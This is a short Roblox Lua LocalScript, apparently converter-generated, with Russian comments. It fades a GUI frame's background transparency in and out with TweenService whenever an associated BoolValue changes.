-- StarterGui.NoliHub.MainFrame.Shadow.LocalScript
local function C_fe()
local script = G2L["fe"];
	local TweenService = game:GetService("TweenService")
	
	local guiElement = script.Parent -- GUI элемент, который нужно скрывать/показывать
	local boolValue = script.Parent.BoolValue -- Предполагаем, что BoolValue находится в том же родителе
	
	-- Функция для плавного изменения прозрачности GUI элемента
	local function fadeGuiElement(targetTransparency, time)
		local tweenInfo = TweenInfo.new(
			time, -- Время анимации
			Enum.EasingStyle.Quad, -- Стиль плавности
			Enum.EasingDirection.InOut, -- Направление анимации
			0, -- Повторение (0 = без повторения)
			false, -- Обратная анимация
			0 -- Задержка перед началом
		)
	
		local tween = TweenService:Create(guiElement, tweenInfo, {BackgroundTransparency = targetTransparency})
		tween:Play()
	end
	
	-- Функция для управления видимостью GUI элемента
	local function updateGuiVisibility()
		if boolValue.Value == true then
			-- Если BoolValue = true, делаем элемент видимым (прозрачность 0)
			fadeGuiElement(0.3, 1) -- Прозрачность 0 за 1 секунду
		else
			-- Если BoolValue = false, делаем элемент невидимым (прозрачность 1)
			fadeGuiElement(1, 1) -- Прозрачность 1 за 1 секунду
		end
	end
	
	-- Отслеживаем изменения значения BoolValue
	boolValue.Changed:Connect(updateGuiVisibility)
	
	-- Если BoolValue уже true/false, обновляем видимость сразу
	updateGuiVisibility()
	
end;
task.spawn(C_fe);
